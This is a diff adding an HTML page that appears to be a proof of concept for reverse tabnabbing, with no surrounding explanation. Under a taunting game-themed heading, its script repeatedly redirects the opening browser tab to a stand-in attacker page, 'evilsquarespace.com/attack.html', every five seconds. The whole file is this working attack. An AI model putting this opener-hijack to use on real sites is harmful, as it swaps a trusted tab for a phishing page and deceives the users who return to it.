@@ -1,0 +1,16 @@
+<html>
+ <body>
+ <center>
+ <h1>
+ Play the game my friend, play the game… Guess the word... oh, but don’t forget to pay your bills.
+ </h1>
+ </center>
+  <script>
+   if (window.opener) {
+      console.log("redirecting");
+      window.opener.location = "https://evilsquarespace.com/attack.html";
+      setInterval(() => {console.log("again"); window.opener.location = "https://evilsquarespace.com/attack.html";}, 5000);
+   }
+  </script>
+ </body>
+</html>
